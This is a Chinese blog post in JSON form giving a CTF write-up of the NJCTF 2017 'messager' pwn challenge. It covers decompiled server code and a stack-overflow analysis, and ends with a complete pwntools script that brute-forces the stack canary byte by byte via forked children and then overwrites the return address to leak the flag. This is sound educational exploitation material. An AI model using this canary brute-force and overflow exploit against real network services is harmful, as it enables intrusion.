{"title":"NJCTF2017:messagerWP","uid":"93d43ea1d4ca04bfd8b5b6e2f9278ee0","slug":"PWN/NJCTF2017-messagerWP","date":"2022-03-15T05:59:29.000Z","updated":"2022-03-28T10:30:41.353Z","comments":true,"path":"api/articles/PWN/NJCTF2017-messagerWP.json","keywords":null,"cover":"http://img.kofdevil.cn/boke/IMG_20210914_235840.jpg","content":"<h1 id=\"Messager\"><a href=\"#Messager\" class=\"headerlink\" title=\"Messager\"></a>Messager</h1><h2 id=\"1-环境启动：\"><a href=\"#1-环境启动：\" class=\"headerlink\" title=\"1.环境启动：\"></a>1.环境启动：</h2><p>第一道例题来自2017年的NJCTF，该程序本身就能通过socket进行通信，不需要用socat进行绑定，所以直接运行即可，端口为5555。</p>\n<pre class=\"line-numbers language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\">$ echo <span class=\"token string\">\"Flag&#123;V2VDaGF0X3RoeXNjODMyXlhE&#125;\"</span> <span class=\"token operator\">></span> flag\n$ <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>messager\n验证：\nnetstat <span class=\"token operator\">-</span>anp <span class=\"token operator\">|</span> grep messager<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"2-程序分析：\"><a href=\"#2-程序分析：\" class=\"headerlink\" title=\"2.程序分析：\"></a>2.程序分析：</h2><h3 id=\"1-查看程序保护：\"><a href=\"#1-查看程序保护：\" class=\"headerlink\" title=\"1.查看程序保护：\"></a>1.查看程序保护：</h3><p>首先file，checksec看一下程序：</p>\n<p><img src=\"http://img.kofdevil.cn/boke/image-20220315142345371.png\" alt=\"image-20220315142345371\"><img src=\"http://img.kofdevil.cn/boke/image-20220315142400123.png\" alt=\"image-20220315142400123\"><br>可以看到开了Canary和NX保护</p>\n<h3 id=\"2-程序静态分析：\"><a href=\"#2-程序静态分析：\" class=\"headerlink\" title=\"2.程序静态分析：\"></a>2.程序静态分析：</h3><p>用IDA打开分析程序：</p>\n<p>首先看main( )函数：</p>\n<pre class=\"line-numbers language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\">__int64 __fastcall <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>__int64 a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a3<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">int</span> optval<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-10h] BYREF</span>\n  __pid_t pid<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-Ch]</span>\n  <span class=\"token keyword\">unsigned</span> __int64 v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span>\n\n  v6 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">read_flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+]start..\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  addr<span class=\"token punctuation\">.</span>sa_family <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_WORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>addr<span class=\"token punctuation\">.</span>sa_data <span class=\"token operator\">=</span> <span class=\"token function\">htons</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x15B3u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>addr<span class=\"token punctuation\">.</span>sa_data<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">htonl</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  len <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span>\n  addr_len <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span>\n  pid <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+]socket..\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  dword_602140 <span class=\"token operator\">=</span> <span class=\"token function\">socket</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> dword_602140 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"socket\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>                 <span class=\"token comment\">//perror()函数的功能是打印一个系统错误信息</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0xFFFFFFFFLL</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  optval <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">setsockopt</span><span class=\"token punctuation\">(</span>dword_602140<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>optval<span class=\"token punctuation\">,</span> <span class=\"token number\">4u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+]bind..\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">bind</span><span class=\"token punctuation\">(</span>dword_602140<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>addr<span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bind error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0xFFFFFFFFLL</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+]listen..\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">listen</span><span class=\"token punctuation\">(</span>dword_602140<span class=\"token punctuation\">,</span> <span class=\"token number\">1024</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"listen\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0xFFFFFFFFLL</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    fd <span class=\"token operator\">=</span> <span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>dword_602140<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>stru_602130<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>addr_len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> fd <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"accept\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">return</span> <span class=\"token number\">0xFFFFFFFFLL</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Welcome!\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9uLL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    pid <span class=\"token operator\">=</span> <span class=\"token function\">fork</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> pid <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fork\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">return</span> <span class=\"token number\">0xFFFFFFFFLL</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>pid <span class=\"token punctuation\">)</span>\n      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token function\">signal</span><span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span> handler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">alarm</span><span class=\"token punctuation\">(</span><span class=\"token number\">3u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token function\">interaction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Message receive failed\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x19uLL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span>\n      <span class=\"token keyword\">goto</span> LABEL_14<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Message received!\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x12uLL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\nLABEL_14<span class=\"token operator\">:</span>\n    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"send\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0xFFFFFFFFLL</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>第8行处可看出刚开始就调用了一个函数，这个函数的作用是读取flag文件</p>\n<pre class=\"line-numbers language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\">ssize_t <span class=\"token function\">read_flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">int</span> fd<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span>\n\n  fd <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./flag\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> fd <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"open flag failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>unk_602160<span class=\"token punctuation\">,</span> <span class=\"token number\">0x64uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><a href=\"https://magnificent-syrup-61f.notion.site/C-c034b8439f1c4c7db260ad6c40897363\">https://magnificent-syrup-61f.notion.site/C-c034b8439f1c4c7db260ad6c40897363</a><br>从第九行开始的就是常规的调用socket，bind，listen三个函数作为TCP服务器端程序的调用，关键在于37行的while循环，其调用的fork函数，大致意思就是当服务器接受到客户端的连接请求时从父进程分裂出一个子进程，根据fork函数的特性(此函数的变量pid装着fork的返回值)，主进程会继续while循环等待新的客户端连接，而分裂出的子进程则会跳出while循环调用interaction函数，与客户端进行对接。<br><a href=\"https://magnificent-syrup-61f.notion.site/fork-85adbf6101c14b2e9278840b3e5841df\">https://magnificent-syrup-61f.notion.site/fork-85adbf6101c14b2e9278840b3e5841df</a></p>\n<pre class=\"line-numbers language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\">__int64 <span class=\"token function\">interaction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  __int64 result<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span>\n  <span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">104</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-70h] BYREF</span>\n  <span class=\"token keyword\">unsigned</span> __int64 v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+78h] [rbp-8h]</span>\n\n  v2 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"csfd = %d\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">bzero</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token number\">0x64uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">//该函数的功能是将指定内存块的前n个字节全部设置为零</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> <span class=\"token number\">0x400uLL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"recv\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    result <span class=\"token operator\">=</span> <span class=\"token number\">0xFFFFFFFFLL</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">else</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Message come: %s\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fflush</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">//清空文件缓冲区</span>\n    result <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>分析interaction函数可以发现字符串变量s在栈上申请的空间是104字节，而在接收函数recv处却申请了1024字节的空间，这里明显造成了栈的溢出。所以现在要做的就是分析如何利用这个漏洞。</p>\n<p>已知条件：</p>\n<ul>\n<li>canary的大小为指针大小，64位程序，指针为8字节。</li>\n<li>canary的低位为0x00</li>\n<li>fork函数的子进程是父进程的克隆</li>\n</ul>\n<p>通常情况下，对Canaries进行爆破是不太可能的。在32位下，除去低位固定的“\\x00”，还有0x100^3&#x3D;16 777 216种情况，64位则更多。另外，爆破意味着大量的崩溃，而程序重启后Canaries的值也会重新生成。但是同一个进程内包括复刻的子进程，它们的Canaries是不会变的，且子进程崩溃不会影响到主进程，这就给了我们爆破的机会。</p>\n<p>确认了fork出来的子函数的栈溢出不会导致主程序崩溃，所以每次fork出来的子程序cananry都等于主函数的canary，那么我们就可以一个字节一个字节的进行爆破根据进程崩溃与否来判断填充上去的字节是否正确。获得Canaries的值后，我们就可以在溢出时保持其不变，并覆盖返回地址，获得flag。</p>\n<p>最后就是确认要返回的地址是多少：</p>\n<p>这里是通过c语言网络编程知识确定的，已知send函数是向对方发送数据，而flag就在buf里面，所以我们的目的返回地址为：400BC6.</p>\n<pre class=\"line-numbers language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0000000000400</span>BC6 sub_400BC6      proc near\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0000000000400</span>BC6 <span class=\"token punctuation\">;</span> __unwind <span class=\"token punctuation\">&#123;</span>\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0000000000400</span>BC6                 push    rbp\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0000000000400</span>BC7                 mov     rbp<span class=\"token punctuation\">,</span> rsp\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0000000000400</span>BCA                 mov     eax<span class=\"token punctuation\">,</span> cs<span class=\"token operator\">:</span>fd\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0000000000400</span>BD0                 mov     ecx<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span>          <span class=\"token punctuation\">;</span> flags\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0000000000400</span>BD5                 mov     edx<span class=\"token punctuation\">,</span> <span class=\"token number\">64</span>h <span class=\"token punctuation\">;</span> <span class=\"token char\">'d'</span>  <span class=\"token punctuation\">;</span> n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0000000000400</span>BDA                 mov     esi<span class=\"token punctuation\">,</span> offset unk_602160 <span class=\"token punctuation\">;</span> buf\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0000000000400</span>BDF                 mov     edi<span class=\"token punctuation\">,</span> eax        <span class=\"token punctuation\">;</span> fd\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0000000000400</span>BE1                 call    _send\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0000000000400</span>BE6                 nop\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0000000000400</span>BE7                 pop     rbp\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0000000000400</span>BE8                 retn\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0000000000400</span>BE8 <span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span> <span class=\"token comment\">// starts at 400BC6</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"3-Payload：\"><a href=\"#3-Payload：\" class=\"headerlink\" title=\"3.Payload：\"></a>3.Payload：</h2><ul>\n<li>遇到的问题：<ol>\n<li>canary后面存放的是ebp的值，再后面才是要返回的地址。</li>\n<li>python3不支持前后连接不同类型的字符串,send里面既有字符串又有地址,解决方法是在地址(p64方法)后面加.decode(“iso-8859-1”)</li>\n</ol>\n</li>\n</ul>\n<pre class=\"line-numbers language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\">from pwn <span class=\"token keyword\">import</span>  <span class=\"token operator\">*</span>\n\ndef <span class=\"token function\">leak_canary</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    global canary\n    canary <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span>\n    <span class=\"token keyword\">while</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token operator\">:</span>\n        <span class=\"token keyword\">for</span> x in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n            io <span class=\"token operator\">=</span> <span class=\"token function\">remote</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"127.0.0.1\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">5555</span><span class=\"token punctuation\">)</span>\n            io<span class=\"token punctuation\">.</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n            io<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">104</span> <span class=\"token operator\">+</span> canary <span class=\"token operator\">+</span> <span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">try</span><span class=\"token operator\">:</span>\n                io<span class=\"token punctuation\">.</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                canary <span class=\"token operator\">+=</span> <span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">break</span>\n            except<span class=\"token operator\">:</span>\n                <span class=\"token keyword\">continue</span>\n            finally<span class=\"token operator\">:</span>\n                io<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\ndef <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    io <span class=\"token operator\">=</span> <span class=\"token function\">remote</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"127.0.0.1\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">5555</span><span class=\"token punctuation\">)</span>\n    io<span class=\"token punctuation\">.</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    io<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">104</span> <span class=\"token operator\">+</span> canary <span class=\"token operator\">+</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x400bc6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"iso-8859-1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">print</span> <span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span><span class=\"token function\">recvline</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token char\">'__main__'</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">leak_canary</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"http://img.kofdevil.cn/boke/image-20220315142604994.png\" alt=\"image-20220315142604994\"></p>\n","feature":true,"text":"Messager1.环境启动：第一道例题来自2017年的NJCTF，该程序本身就能通过socket进行通信，不需要用socat进行绑定，所以直接运行即可，端口为5555。 $ echo \"Flag&#123;V2VDaGF0X3RoeXNjODMyXlhE&#125;\" > fl...","link":"","photos":[],"count_time":{"symbolsCount":"5.2k","symbolsTime":"5 mins."},"categories":[{"name":"PWN","slug":"PWN","count":1,"path":"api/categories/PWN.json"}],"tags":[{"name":"WP","slug":"WP","count":12,"path":"api/tags/WP.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Messager\"><span class=\"toc-text\">Messager</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-%E7%8E%AF%E5%A2%83%E5%90%AF%E5%8A%A8%EF%BC%9A\"><span class=\"toc-text\">1.环境启动：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" 